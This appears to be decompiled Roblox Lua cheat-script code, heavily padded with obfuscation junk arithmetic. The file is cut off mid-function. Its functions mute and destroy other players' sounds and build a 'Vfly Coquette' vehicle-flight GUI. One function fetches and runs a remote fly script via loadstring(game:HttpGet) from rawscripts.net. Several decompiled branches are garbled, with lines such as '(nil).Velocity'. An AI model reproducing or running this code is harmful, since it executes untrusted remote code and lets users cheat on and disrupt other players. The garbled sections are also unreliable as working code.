	local v4 = table.pack(bit32.band(bit32.bor(n2, 388580483), 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local v6 = bit32.band(47200 * v5[1] + bit32.lshift(bit32.band(47200 * bit32.rshift(v4[1], 16) + 3153 * v5[1], 65535), 16), 4294967295)
	local v7 = table.pack(bit32.band(bit32.bxor(n2, 388580483), 4294967295))
	local v8 = table.pack(bit32.band(v7[1], 65535))
	local n4 = n3 + v6 + bit32.band(9169 * v8[1] + bit32.lshift(bit32.band(9169 * bit32.rshift(v7[1], 16) + 31191 * v8[1], 65535), 16), 4294967295)
	containers[arg2] = true
	local v9 = pcall
	local v10 = bit32.bxor(n4, 70476314)

	v9(function()
		arg2.Parent = nil
	end)
end

-- payload closure created 977-th (proto #t4694)
local function payload_fn_977(arg)
	local n2 = 332589422
	if upv1[arg] then
		return
	end
	local v = upv2[arg]

	if v then
		upv3(v.conns)
	end

	local tbl = {}
	local v2 = table.pack(bit32.band(n2, 4294967295))
	local v3 = table.pack(bit32.band(v2[1], 65535))
	local n3 = bit32.band(65417 * v3[1] + bit32.lshift(bit32.band(65417 * bit32.rshift(v2[1], 16) + 40257 * v3[1], 65535), 16), 4294967295) + 2137408862
	local v4 = table.pack(bit32.band(bit32.bor(n2, 175379694), 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local v6 = bit32.band(238 * v5[1] + bit32.lshift(bit32.band(238 * bit32.rshift(v4[1], 16) + 50556 * v5[1], 65535), 16), 4294967295)
	local v7 = table.pack(bit32.band(bit32.bxor(n2, 175379694), 4294967295))
	local v8 = table.pack(bit32.band(v7[1], 65535))
	local n4 = n3 + v6 + bit32.band(65418 * v8[1] + bit32.lshift(bit32.band(65418 * bit32.rshift(v7[1], 16) + 40257 * v8[1], 65535), 16), 4294967295)
	tbl.containers = {}
	tbl.conns = {}
	upv1[arg] = tbl

	for _, child in ipairs(arg:GetChildren()) do
		if upv4(child) then
			upv5(arg, child)
		end
	end

	local insert = table.insert
	local v9 = bit32.bxor(n4, 348072614)

	insert(tbl.conns, arg.ChildAdded:Connect(function(child)
		if upv6 and upv4(child) then
			task.defer(upv5, arg, child)
		end
	end))
end

-- payload closure created 978-th (proto #t2383)
local function payload_fn_978(parent)
	local v = upv1[parent]
	if not v then
		return
	end
	upv1[parent] = nil
	upv2(v.conns)

	for k in pairs(v.containers) do
		if parent.Parent == upv3 and k.Parent == nil then
			local flag = type("containers") == "userdata"
			local n2 = 8648720519

			pcall(function()
				k.Parent = parent
			end)
		end
	end
end

-- payload closure created 979-th (proto #626)
local function payload_fn_979(arg, arg2)
	local flag = type(0) == "userdata"
	local n2 = 501010479

	table.insert(arg.conns, arg2.ChildAdded:Connect(function(child)
		if child:IsA("Tool") then
			arg.eventos = arg.eventos + 1
		end
	end))
end

-- payload closure created 980-th (proto #624)
local function payload_fn_980(arg)
	local n2 = 339978599
	if arg == upv1 or upv2[arg] then
		return
	end
	local tbl = { conns = {}, eventos = 0, seguidos = 0 }
	upv2[arg] = tbl
	local n3 = n2 + 138958785 + 246563686

	for _, child in ipairs(arg:GetChildren()) do
		if upv3(child) then
			upv4(tbl, child)
		end
	end

	table.insert(tbl.conns, arg.ChildAdded:Connect(function(child)
		if upv3(child) then
			upv4(tbl, child)
		end
	end))
end

-- payload closure created 981-th (proto #627)
local function payload_fn_981(arg)
	local v = upv1[arg]

	if v then
		upv2(v.conns)
		upv1[arg] = nil
	end

	local v2 = upv3[arg]

	if v2 then
		upv2(v2.conns)
		upv3[arg] = nil
	end
end

-- payload closure created 982-th (proto #820)
local function payload_fn_982(arg)
	upv1 += arg
	if upv1 < 1 then
		return
	end
	upv1 = 0

	for k, v in pairs(upv2) do
		if not upv3[k] then
			if v.eventos > upv4 then
				v.seguidos = v.seguidos + 1

				if upv5 <= v.seguidos then
					upv6(k)
				end
			else
				v.seguidos = 0
			end

			v.eventos = 0
		end
	end
end

-- payload closure created 983-th (proto #623)
local function payload_fn_983()
	upv1(upv2)

	for _, player in ipairs(upv3:GetPlayers()) do
		upv4(player)
	end

	table.insert(upv2, upv3.PlayerAdded:Connect(upv4))
	table.insert(upv2, upv3.PlayerRemoving:Connect(upv5))
	table.insert(upv2, upv6.Heartbeat:Connect(upv7))
end

-- payload closure created 984-th (proto #620)
local function payload_fn_984()
	upv1 = false
	upv2(upv3)

	for k in pairs(upv4) do
		upv5(k)
	end

	for k in pairs(upv6) do
		upv7(k)
	end
end

-- payload closure created 985-th (proto #619)
local function payload_fn_985()
	return upv1
end

-- payload closure created 986-th (proto #618)
local function payload_fn_986()
	local tbl = {}

	for k in pairs(upv1) do
		table.insert(tbl, k.Name)
	end

	return tbl
end

-- payload closure created 987-th (proto #622)
local function payload_fn_987(arg)
	upv1 = arg

	if arg then
		upv2()
	else
		upv3()
	end
end

-- payload closure created 990-th (proto #633)
local function payload_fn_990(arg)
	local n2 = 287542059
	local flag = type(0) == "userdata"
	if not arg or not arg:IsA("Sound") then
		return
	end
	local n3 = n2 + 459209226
	local localPlayer = upv1.LocalPlayer
	localPlayer = localPlayer and localPlayer:FindFirstChild("PlayerGui")
	if localPlayer and arg:IsDescendantOf(localPlayer) then
		return
	end
	local n4 = n3 - 97692071

	pcall(function()
		arg.Volume = 0
		arg:Stop()
		arg.SoundId = ""
		arg:Destroy()
	end)
end

-- payload closure created 991-th (proto #632)
local function payload_fn_991(arg)
	local n2 = 240620461
	if not arg or not arg:IsA("Sound") then
		return
	end
	local v = upv1
	local v2 = bit32.bxor(n2, 16714541)
	v(arg)
	local v3 = table.pack(bit32.band(v2, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = bit32.band(31602 * v4[1] + bit32.lshift(bit32.band(31602 * bit32.rshift(v3[1], 16) + 36138 * v4[1], 65535), 16), 4294967295) + 1722105850
	local v5 = table.pack(bit32.band(bit32.bor(v2, 518944357), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(2332 * v6[1] + bit32.lshift(bit32.band(2332 * bit32.rshift(v5[1], 16) + 58795 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bxor(v2, 518944357), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + v7 + bit32.band(31603 * v9[1] + bit32.lshift(bit32.band(31603 * bit32.rshift(v8[1], 16) + 36138 * v9[1], 65535), 16), 4294967295)

	pcall(function()
		local flag = bit32.bxor(n4, 0) + 228982691 == 388078245
		local n5 = 400559145

		local connection = arg:GetPropertyChangedSignal("SoundId"):Connect(function()
			if upv2 and arg.SoundId ~= "" then
				upv1(arg)
			end
		end)

		local connection2 = arg:GetPropertyChangedSignal("Playing"):Connect(function()
			if upv2 and arg.Playing then
				upv1(arg)
			end
		end)

		table.insert(upv3, connection)
		table.insert(upv3, connection2)
	end)
end

-- payload closure created 992-th (proto #631)
local function payload_fn_992(arg)
	local n2 = 37824767
	if not arg then
		return
	end
	local n3 = n2 + 425542301

	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("Sound") then
			upv1(descendant)
		end
	end

	local n4 = n3 - 217383365

	table.insert(upv2, arg.DescendantAdded:Connect(function(descendant)
		if upv3 and descendant:IsA("Sound") then
			upv1(descendant)
		end
	end))
end

-- payload closure created 993-th (proto #630)
local function payload_fn_993(arg)
	local n2 = 264298499

	if arg.Character then
		upv1(arg.Character)
	end

	local n3 = n2 + 294317190 - 184934289

	table.insert(upv2, arg.CharacterAdded:Connect(function(character)
		if upv3 then
			task.defer(upv1, character)
		end
	end))
end

-- payload closure created 994-th (proto #629)
local function payload_fn_994()
	local n2 = 259318654
	local n3 = 2863420599

	for _, v in ipairs(upv1) do
		local n4 = 801310335

		pcall(function()
			v:Disconnect()
		end)
	end

	local v = bit32.bxor(n2, 151918689)
	upv1 = {}
	local localPlayer = upv2.LocalPlayer
	localPlayer = localPlayer and localPlayer:FindFirstChild("PlayerGui")
	local v2 = ipairs
	local v3 = table.pack(bit32.band(v, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n4 = bit32.band(21220 * v4[1] + bit32.lshift(bit32.band(21220 * bit32.rshift(v3[1], 16) + 30855 * v4[1], 65535), 16), 4294967295) + 1547152060
	local v5 = table.pack(bit32.band(bit32.bor(v, 112613031), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(44317 * v6[1] + bit32.lshift(bit32.band(44317 * bit32.rshift(v5[1], 16) + 34680 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.band(v, 112613031), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n5 = n4 + v7 + bit32.band(44315 * v9[1] + bit32.lshift(bit32.band(44315 * bit32.rshift(v8[1], 16) + 34680 * v9[1], 65535), 16), 4294967295)

	for _, descendant in v2(upv3:GetDescendants()) do
		if descendant:IsA("Sound") and (not localPlayer or not descendant:IsDescendantOf(localPlayer)) then
			upv4(descendant)
		end
	end

	local v10 = ipairs

	for _, descendant in v10(upv5:GetDescendants()) do
		if descendant:IsA("Sound") and (not localPlayer or not descendant:IsDescendantOf(localPlayer)) then
			upv4(descendant)
		end
	end

	for _, player in ipairs(upv2:GetPlayers()) do
		upv6(player)
	end

	table.insert(upv1, upv2.PlayerAdded:Connect(function(player)
		if upv7 then
			upv6(player)
		end
	end))

	table.insert(upv1, upv3.DescendantAdded:Connect(function(descendant)
		if upv7 and descendant:IsA("Sound") then
			upv4(descendant)
		end
	end))

	table.insert(upv1, upv5.DescendantAdded:Connect(function(descendant)
		if upv7 and descendant:IsA("Sound") then
			upv4(descendant)
		end
	end))
end

-- payload closure created 995-th (proto #635)
local function payload_fn_995()
	local flag = false
	upv1 = false

	for _, v in ipairs(upv2) do
		local n2 = 8822686024

		pcall(function()
			v:Disconnect()
		end)
	end

	upv2 = {}
end

-- payload closure created 996-th (proto #628)
local function payload_fn_996(arg)
	upv1 = arg

	if arg then
		upv2()
	else
		upv3()
	end
end

-- payload closure created 1006-th (proto #637)
local function payload_fn_1006()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-gui-v3-30439"))()
end

-- payload closure created 1007-th (proto #638)
local function payload_fn_1007()
	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local TweenService = game:GetService("TweenService")
	FLYING = false
	vehicleflyspeed = 1
	local connection = nil
	local connection2 = nil
	local connection3 = nil
	local localPlayer = Players.LocalPlayer

	local function fn()
		local str = ""

		for i = 1, 10 do
			str ..= string.char(math.random(65, 90))
		end

		return str
	end

	local v = fn(38632327, 426389308)
	local v2 = fn(38632327, 286041583)

	local function fn2()
		local character = localPlayer.Character
		if not character then
			return nil
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid then
			return nil
		end
		local seatPart = humanoid.SeatPart

		if seatPart then
			local model = seatPart:FindFirstAncestorOfClass("Model")
			if model then
				return model:FindFirstChild("VehicleSeat") or model.PrimaryPart or model:FindFirstChildOfClass("BasePart")
			end
		end

		return nil
	end

	local function fn3()
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if humanoid then
			workspace.CurrentCamera.CameraSubject = humanoid
			workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
			localPlayer.CameraMinZoomDistance = 0.5
			localPlayer.CameraMaxZoomDistance = 400
			localPlayer.CameraMode = Enum.CameraMode.Classic

			if character:FindFirstChild("Head") then
				character.Head.Anchored = false
			end
		end
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VFlyGui"
	screenGui.ResetOnSpawn = false
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Parent = localPlayer.PlayerGui
	local frame = Instance.new("Frame")
	frame.Name = "Holder"
	frame.Size = UDim2.new(0, 220, 0, 180)
	frame.Position = UDim2.new(0.5, -110, 0.5, -90)
	frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.ClipsDescendants = true
	frame.Parent = screenGui
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
	local uiStroke = Instance.new("UIStroke")
	uiStroke.Color = Color3.fromRGB(0, 180, 60)
	uiStroke.Thickness = 1.5
	uiStroke.Parent = frame
	local frame2 = Instance.new("Frame")
	frame2.Size = UDim2.new(1, 0, 0, 32)
	frame2.BackgroundColor3 = Color3.fromRGB(0, 140, 45)
	frame2.BorderSizePixel = 0
	frame2.Parent = frame
	local textLabel = Instance.new("TextLabel")
	textLabel.Size = UDim2.new(1, -60, 1, 0)
	textLabel.Position = UDim2.new(0, 10, 0, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextSize = 14
	textLabel.Text = "Vfly Coquette"
	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	textLabel.TextXAlignment = Enum.TextXAlignment.Left
	textLabel.Parent = frame2
	local textButton = Instance.new("TextButton")
	textButton.Size = UDim2.new(0, 28, 0, 28)
	textButton.Position = UDim2.new(1, -60, 0, 2)
	textButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	textButton.Font = Enum.Font.GothamBold
	textButton.TextSize = 14
	textButton.Text = "-"
	textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	textButton.BorderSizePixel = 0
	textButton.Parent = frame2
	Instance.new("UICorner", textButton).CornerRadius = UDim.new(0, 4)
	local textButton2 = Instance.new("TextButton")
	textButton2.Size = UDim2.new(0, 28, 0, 28)
	textButton2.Position = UDim2.new(1, -30, 0, 2)
	textButton2.BackgroundColor3 = Color3.fromRGB(180, 30, 30)
	textButton2.Font = Enum.Font.GothamBold
	textButton2.TextSize = 14
	textButton2.Text = "X"
	textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
	textButton2.BorderSizePixel = 0
	textButton2.Parent = frame2
	Instance.new("UICorner", textButton2).CornerRadius = UDim.new(0, 4)
	local frame3 = Instance.new("Frame")
	frame3.Size = UDim2.new(1, 0, 1, -32)
	frame3.Position = UDim2.new(0, 0, 0, 32)
	frame3.BackgroundTransparency = 1
	frame3.Parent = frame
	local textLabel2 = Instance.new("TextLabel")
	textLabel2.Size = UDim2.new(1, 0, 0, 30)
	textLabel2.Position = UDim2.new(0, 0, 0, 8)
	textLabel2.BackgroundTransparency = 1
	textLabel2.Font = Enum.Font.Gotham
	textLabel2.TextSize = 13
	textLabel2.Text = "Status: OFF"
	textLabel2.TextColor3 = Color3.fromRGB(220, 50, 50)
	textLabel2.Parent = frame3
	local textLabel3 = Instance.new("TextLabel")
	textLabel3.Size = UDim2.new(0, 70, 0, 30)
	textLabel3.Position = UDim2.new(0, 14, 0, 44)
	textLabel3.BackgroundTransparency = 1
	textLabel3.Font = Enum.Font.GothamBold
	textLabel3.TextSize = 13
	textLabel3.Text = "Speed:"
	textLabel3.TextColor3 = Color3.fromRGB(220, 220, 220)
	textLabel3.TextXAlignment = Enum.TextXAlignment.Left
	textLabel3.Parent = frame3
	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(0, 90, 0, 28)
	textBox.Position = UDim2.new(0, 90, 0, 46)
	textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	textBox.Font = Enum.Font.GothamBold
	textBox.TextSize = 13
	textBox.Text = tostring(vehicleflyspeed * 50)
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.BorderSizePixel = 0
	textBox.ClearTextOnFocus = false
	textBox.Parent = frame3
	Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)
	local color = Color3.fromRGB
	Instance.new("UIStroke", textBox).Color = color(0, 160, 50)

	textBox.FocusLost:Connect(function()
		local num = tonumber(textBox.Text)

		if num and num > 0 then
			vehicleflyspeed = num / 50
		else
			textBox.Text = tostring(vehicleflyspeed * 50)
		end
	end)

	local n2 = 17934405581
	local textButton3 = Instance.new("TextButton")
	textButton3.Size = UDim2.new(1, -28, 0, 36)
	textButton3.Position = UDim2.new(0, 14, 0, 96)
	textButton3.BackgroundColor3 = Color3.fromRGB(0, 160, 50)
	textButton3.Font = Enum.Font.GothamBold
	textButton3.TextSize = 15
	textButton3.Text = "Enable"
	textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
	textButton3.BorderSizePixel = 0
	textButton3.Parent = frame3
	local uiCorner = Instance.new("UICorner", textButton3)
	local v3 = table.pack(bit32.band(3220176637, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	bit32.band(50487 * v4[1] + bit32.lshift(bit32.band(50487 * bit32.rshift(v3[1], 16) + 18398 * v4[1], 65535), 16), 4294967295)
	uiCorner.CornerRadius = UDim.new(0, 8)

	local function fn4()
		textLabel2.Text = "Status: ON"
		textLabel2.TextColor3 = Color3.fromRGB(0, 220, 80)
		textButton3.Text = "Disable"
		textButton3.BackgroundColor3 = Color3.fromRGB(160, 30, 30)
	end

	local n3 = 541371969
	local flag = false

	textButton.MouseButton1Click:Connect(function()
		flag = not flag

		if flag then
			TweenService:Create(frame, TweenInfo.new(0.2), { Size = UDim2.new(0, 220, 0, 32) }):Play()
		else
			TweenService:Create(frame, TweenInfo.new(0.2), { Size = UDim2.new(0, 220, 0, 180) }):Play()
		end
	end)

	textButton2.MouseButton1Click:Connect(function()
		FLYING = false
		screenGui:Destroy()
	end)

	local function fn5(arg, arg2, arg3)
		local flag2 = bit32.bxor(arg2, 376992734) == 477593832
		local v5 = task
		local v6 = table.pack(bit32.band(arg2, 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local v8 = bit32.band(1102 * v7[1] + bit32.lshift(bit32.band(1102 * bit32.rshift(v6[1], 16) + 58623 * v7[1], 65535), 16), 4294967295)
		local v9 = table.pack(bit32.band(bit32.bnot(arg2), 4294967295))
		local v10 = table.pack(bit32.band(v9[1], 65535))
		local n4 = 4149341419 + v8 + bit32.band(1102 * v10[1] + bit32.lshift(bit32.band(1102 * bit32.rshift(v9[1], 16) + 58623 * v10[1], 65535), 16), 4294967295) + 461977435

		v5.spawn(function()
			local flag3 = type(0) == "boolean"
			local flag4 = false
			local v11 = nil
			local n5 = 581042335
			local vector_ = Vector3.zero
			local position = nil

			local function fn6(arg4)
				local n6 = arg4.Position - vector_
				local udim2 = UDim2.new(position.X.Scale, position.X.Offset + n6.X, position.Y.Scale, position.Y.Offset + n6.Y)
				TweenService:Create(arg3, TweenInfo.new(0.05), { Position = udim2 }):Play()
			end

			arg.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					flag4 = true
					vector_ = input.Position
					local n6 = 13224289852
					position = arg3.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							flag4 = false
						end
					end)
				end
			end)

			arg.InputChanged:Connect(function(input)
				local flag5 = input.UserInputType == Enum.UserInputType.MouseMovement

				if flag5 or input.UserInputType == Enum.UserInputType.Touch then
					v11 = input
				end
			end)

			UserInputService.InputChanged:Connect(function(input)
				if input == v11 and flag4 then
					fn6(input)
				end
			end)
		end)
	end

	fn5(frame2, 304144946, frame, 488131606)

	sFLY_vehicle = function()
		local n4 = 436549034
		local n5 = 3071897900
		local n6 = 1362076337

		if connection then
			connection:Disconnect()
		end

		if connection2 then
			connection2:Disconnect()
		end

		local tbl = {}
		tbl.F = 0
		tbl.B = 0
		tbl.L = 0
		tbl.R = 0
		tbl.Q = 0
		tbl.E = 0
		local tbl2 = { F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0 }
		local n7 = 0
		local n8 = n4 + 72436842 + 50805543
		FLYING = true
		fn4()
		fn3()

		task.spawn(function()
			local n9 = 241340916
			local bodyGyro = nil
			local bodyVelocity = nil
			local v5 = nil

			while true do
				local n10 = n9 + 161434124
				task.wait()
				local currentCamera = workspace.CurrentCamera
				local v6 = fn2()

				if v6 ~= v5 then
					if bodyGyro then
						pcall(function()
							bodyGyro:Destroy()
						end)
					end

					if bodyVelocity then
						pcall(function()
							bodyVelocity:Destroy()
						end)
					end

					if v6 then
						bodyGyro = Instance.new("BodyGyro")
						bodyGyro.P = 90000
						bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
						bodyGyro.CFrame = v6.CFrame
						bodyGyro.Parent = v6
						bodyVelocity = Instance.new("BodyVelocity")
						bodyVelocity.Velocity = Vector3.zero
						bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
						bodyVelocity.Parent = v6
					else
						bodyGyro = nil
						bodyVelocity = nil
					end

					v5 = v6
				end

				if v6 and bodyGyro and bodyVelocity then
					local flag2 = tbl.L + tbl.R ~= 0 or tbl.F + tbl.B ~= 0

					if not flag2 then
						flag2 = tbl.Q + tbl.E ~= 0
						n10 = n10 - 36550614 + 36550614
					end

					if flag2 then
						n7 = vehicleflyspeed * 50
					end

					if tbl.L + tbl.R ~= 0 or tbl.F + tbl.B ~= 0 or tbl.Q + tbl.E ~= 0 then
						local p = currentCamera.CFrame.p
						bodyVelocity.Velocity = (currentCamera.CFrame.LookVector * (tbl.F + tbl.B) + currentCamera.CFrame * CFrame.new(tbl.L + tbl.R, (tbl.F + tbl.B + tbl.Q + tbl.E) * 0.2, 0).p - p) * n7
						tbl2 = { F = tbl.F, B = tbl.B, L = tbl.L, R = tbl.R }
						n10 = n10 + 136472059 - 36569002 - 99903057
					else
						bodyVelocity.Velocity = Vector3.zero
						n10 = n10 - 34449263 + 34449263
					end

					bodyGyro.CFrame = currentCamera.CFrame
				end

				n9 = n10 - 161434124
			end
		end)

		connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
			local n9 = 23434693
			local n10 = 3735138569
			local n11 = 3351803786
			if gameProcessed then
				return
			end

			if input.KeyCode == Enum.KeyCode.W then
				tbl.F = vehicleflyspeed
			elseif input.KeyCode == Enum.KeyCode.S then
				tbl.B = -vehicleflyspeed
			elseif input.KeyCode == Enum.KeyCode.A then
				tbl.L = -vehicleflyspeed
			elseif input.KeyCode == Enum.KeyCode.D then
				tbl.R = vehicleflyspeed
			else
				local v5 = table.pack(bit32.band(n10, 4294967295))
				local v6 = table.pack(bit32.band(v5[1], 65535))
				local v7 = bit32.band(v6[1] * 11621 + bit32.lshift(bit32.band(v6[1] * 0 + bit32.rshift(v5[1], 16) * 11621, 65535), 16), 4294967295)

				if input.KeyCode == Enum.KeyCode.E then
					tbl.Q = vehicleflyspeed * 2
				elseif input.KeyCode == Enum.KeyCode.Q then
					tbl.E = -vehicleflyspeed * 2
				end
			end
		end)

		local n9 = n5 + 2805045027

		connection2 = UserInputService.InputEnded:Connect(function(input, gameProcessed)
			local n10 = 1557055032
			local n11 = 4052136074
			local v5 = bit32.bxor(n9, 3300613049)
			if gameProcessed then
				return
			end

			if input.KeyCode == Enum.KeyCode.W then
				tbl.F = 0
			elseif input.KeyCode == Enum.KeyCode.S then
				tbl.B = 0
			else
				local v6 = bit32.bxor(v5, 4294967295)

				if input.KeyCode == Enum.KeyCode.A then
					tbl.L = 0
				elseif input.KeyCode == Enum.KeyCode.D then
					tbl.R = 0
				else
					local flag2 = input.KeyCode == Enum.KeyCode.E
					local n12 = n11 + v6

					if flag2 then
						tbl.Q = 0
					elseif input.KeyCode == Enum.KeyCode.Q then
						tbl.E = 0
					end
				end
			end
		end)
	end

	mobilefly_vehicle = function()
		local n4 = 4689975

		if connection3 then
			connection3:Disconnect()
		end

		FLYING = true
		fn4()
		fn3()
		local vector_ = Vector3.zero
		local vector_2 = Vector3.new(9e9, 9e9, 9e9)
		local ControlModule = nil
		local n5 = n4 + 209206787 + 83435163

		pcall(function()
			ControlModule = require(localPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
		end)

		local BodyVelocity = nil
		local bodyGyro = nil
		local v5 = nil

		connection3 = RunService.RenderStepped:Connect(function()
			local n6 = 1047693363
			local n7 = 454772316
			local n8 = 2005429326
			local v6 = fn2()
			local currentCamera = workspace.CurrentCamera
			local moveVector, velocity, v7

			if v6 ~= v5 then
				if BodyVelocity then
					local n9 = 4341820545

					pcall(function()
						BodyVelocity:Destroy()
					end)
				end

				local v8

				if bodyGyro then
					pcall(nil)

					if v6 then
						local new = Instance.new
						local v9 = bit32.bor(n7, n8)
						BodyVelocity = new("BodyVelocity")
						BodyVelocity.Name = v
						BodyVelocity.MaxForce = vector_2
						BodyVelocity.Velocity = vector_
						BodyVelocity.Parent = v6
						bodyGyro = Instance.new("BodyGyro")
						bodyGyro.Name = v2
						bodyGyro.MaxTorque = vector_2
						local v10 = bodyGyro
						v10.P = 1000
						bodyGyro.D = 50
						bodyGyro.Parent = v6
						n8 = n8 - v9 + 2140892766
						n7 = v9 + 2608846846
					else
						BodyVelocity = nil
						bodyGyro = nil
					end

					v5 = v6

					if v6 then
						v8 = nil and bodyGyro

						if v8 then
							BodyVelocity.MaxForce = vector_2
							bodyGyro.MaxTorque = vector_2
							bodyGyro.CFrame = currentCamera.CoordinateFrame
							BodyVelocity.Velocity = vector_

							if ControlModule then
								moveVector = ControlModule:GetMoveVector()

								if nil then
									velocity = BodyVelocity.Velocity
									local v9 = table.pack(bit32.band(n8, 4294967295))
									local v10 = table.pack(bit32.band(n7, 4294967295))
									local v11 = table.pack(bit32.band(v9[1], 65535))
									local v12 = table.pack(bit32.rshift(v9[1], 16))
									local v13 = table.pack(bit32.band(v10[1], 65535))

									v7 = bit32.band(v11[1] * v13[1] + bit32.lshift(bit32.band(v11[1] * bit32.rshift(v10[1], 16) + v12[1] * v13[1], 65535), 16), 4294967295)
									;(nil).Velocity = velocity + currentCamera.CFrame.RightVector * moveVector.X * vehicleflyspeed * 50
								end

								if nil ~= 0 then
									(nil).Velocity = BodyVelocity.Velocity - currentCamera.CFrame.LookVector * moveVector.Z * vehicleflyspeed * 50
								end
							end
						end
					else
						v8 = v6 and bodyGyro

						if v8 then
							BodyVelocity.MaxForce = vector_2
							bodyGyro.MaxTorque = vector_2
							bodyGyro.CFrame = currentCamera.CoordinateFrame
							BodyVelocity.Velocity = vector_

							if ControlModule then
								moveVector = ControlModule:GetMoveVector()

								if nil then
									velocity = BodyVelocity.Velocity
									local v9 = table.pack(bit32.band(n8, 4294967295))
									local v10 = table.pack(bit32.band(n7, 4294967295))
									local v11 = table.pack(bit32.band(v9[1], 65535))
									local v12 = table.pack(bit32.rshift(v9[1], 16))
									local v13 = table.pack(bit32.band(v10[1], 65535))

									v7 = bit32.band(v11[1] * v13[1] + bit32.lshift(bit32.band(v11[1] * bit32.rshift(v10[1], 16) + v12[1] * v13[1], 65535), 16), 4294967295)
									;(nil).Velocity = velocity + currentCamera.CFrame.RightVector * moveVector.X * vehicleflyspeed * 50
								end

								if nil ~= 0 then
									(nil).Velocity = BodyVelocity.Velocity - currentCamera.CFrame.LookVector * moveVector.Z * vehicleflyspeed * 50
								end
							end
						end
					end
				else
					if v6 then
						local new = Instance.new
						local v9 = bit32.bor(n7, n8)
						BodyVelocity = new("BodyVelocity")
						BodyVelocity.Name = v
						BodyVelocity.MaxForce = vector_2
						BodyVelocity.Velocity = vector_
						BodyVelocity.Parent = v6
						bodyGyro = Instance.new("BodyGyro")
						bodyGyro.Name = v2
						bodyGyro.MaxTorque = vector_2
						local v10 = bodyGyro
						v10.P = 1000
						bodyGyro.D = 50
						bodyGyro.Parent = v6
						n8 = n8 - v9 + 2140892766
						n7 = v9 + 2608846846
					else
						BodyVelocity = nil
						bodyGyro = nil
					end

					v5 = v6

					if v6 then
						v8 = nil and bodyGyro

						if v8 then
							BodyVelocity.MaxForce = vector_2
							bodyGyro.MaxTorque = vector_2
							bodyGyro.CFrame = currentCamera.CoordinateFrame
							BodyVelocity.Velocity = vector_

							if ControlModule then
								moveVector = ControlModule:GetMoveVector()

								if nil then
									velocity = BodyVelocity.Velocity
									local v9 = table.pack(bit32.band(n8, 4294967295))
									local v10 = table.pack(bit32.band(n7, 4294967295))
									local v11 = table.pack(bit32.band(v9[1], 65535))
									local v12 = table.pack(bit32.rshift(v9[1], 16))
									local v13 = table.pack(bit32.band(v10[1], 65535))

									v7 = bit32.band(v11[1] * v13[1] + bit32.lshift(bit32.band(v11[1] * bit32.rshift(v10[1], 16) + v12[1] * v13[1], 65535), 16), 4294967295)
									;(nil).Velocity = velocity + currentCamera.CFrame.RightVector * moveVector.X * vehicleflyspeed * 50
								end

								if nil ~= 0 then
									(nil).Velocity = BodyVelocity.Velocity - currentCamera.CFrame.LookVector * moveVector.Z * vehicleflyspeed * 50
								end
							end
						end
					end
				end
			elseif v6 then
				if nil and bodyGyro then
					BodyVelocity.MaxForce = vector_2
					bodyGyro.MaxTorque = vector_2
					bodyGyro.CFrame = currentCamera.CoordinateFrame
					BodyVelocity.Velocity = vector_

					if ControlModule then
						moveVector = ControlModule:GetMoveVector()

						if nil then
							velocity = BodyVelocity.Velocity
							local v8 = table.pack(bit32.band(n8, 4294967295))
							local v9 = table.pack(bit32.band(n7, 4294967295))
							local v10 = table.pack(bit32.band(v8[1], 65535))
							local v11 = table.pack(bit32.rshift(v8[1], 16))
							local v12 = table.pack(bit32.band(v9[1], 65535))

							v7 = bit32.band(v10[1] * v12[1] + bit32.lshift(bit32.band(v10[1] * bit32.rshift(v9[1], 16) + v11[1] * v12[1], 65535), 16), 4294967295)
							;(nil).Velocity = velocity + currentCamera.CFrame.RightVector * moveVector.X * vehicleflyspeed * 50
						end

						if nil ~= 0 then
							(nil).Velocity = BodyVelocity.Velocity - currentCamera.CFrame.LookVector * moveVector.Z * vehicleflyspeed * 50
						end
					end
				end
			end
		end)
	end

	NOFLY_vehicle = function()
		FLYING = false
